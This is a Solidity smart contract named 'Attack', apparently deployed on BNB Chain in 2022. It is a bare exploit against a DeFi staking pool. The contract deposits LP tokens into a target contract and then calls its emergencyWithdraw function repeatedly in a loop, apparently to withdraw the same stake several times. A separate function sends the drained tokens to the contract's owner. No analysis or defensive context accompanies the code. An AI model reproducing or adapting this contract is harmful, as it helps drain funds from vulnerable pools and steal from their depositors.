/**
 *Submitted for verification at BscScan.com on 2022-07-25
*/

// SPDX-License-Identifier: MIT


pragma solidity =0.8.12;

interface IBEP20 {

    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    
}

contract Attack  {
    address addr;
    address owner;

   
    constructor(address addr_){
        addr = addr_ ;
        owner = msg.sender;
       
    }

 
    function transferToAccount(address lp) external returns(bool){
        IBEP20 LpToken = IBEP20(lp);
        uint256 amount = LpToken.balanceOf(address(this));
        LpToken.transfer(owner, amount);
        return true;
    }
    function depositToContract(uint256 poolId, address lp) public returns(bool){
        IBEP20 LpToken = IBEP20(lp);
        uint256 amount = LpToken.balanceOf(address(this));      
        (bool success,) = addr.call(abi.encodeWithSignature("deposit(uint256,uint256)", poolId, amount));
        return success;
    }
    function attack(uint8 count, uint256 poolId) public returns(bool){
        for(uint i=0; i<= count; i++){
            addr.call(abi.encodeWithSignature("emergencyWithdraw(uint256)", poolId));
        }
        return true;
    }
}